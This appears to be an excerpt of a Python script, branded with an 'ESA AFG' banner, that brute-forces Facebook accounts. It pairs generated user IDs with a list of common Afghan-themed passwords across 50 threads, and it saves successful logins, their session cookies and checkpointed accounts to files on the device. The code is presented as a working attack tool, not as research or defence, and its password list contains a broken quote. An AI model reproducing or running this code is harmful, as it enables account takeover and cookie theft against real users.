...
logo ="""  \033[1;92m        
  ...
  dMMMP    VMMMb  dMMMMMP  
 dMP     dP .dMP dMP dMP   
dMMMMMP  VMMMP" dMP dMP
\033[1;97m====================================================
\033[1;97m[+] AUTHOR   : ESA AFG
\033[1;97m[+] FACEBOOK : RAYESS ESA
\033[1;97m[+] TEAM     : AFGHAN ESA
...
def afg():
    ...
    with ThreadPool(max_workers=50) as basir:
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','afghan123','afghanistan','10002000','200300','600700,'700800','123456','Afghanistan123','Afghanistan','Afghan123','Afghan1234','Afghan12345','khankhan','khan123','khan1234','khan12345','kobul1234','kobul12345','kabul123','kabul12345','500500','600600','800800','900900','300300','200200','100100','400400','400500']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32m[ESA😘-OK]  ' +uid+ ' | ' +ps+'  \n\033[1;37m[] COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ESA😘-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;31m[ESA😿-CP]  ' +uid+ ' | ' +ps+'  \33[0;97m')
                open('/sdcard/ESA😿-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
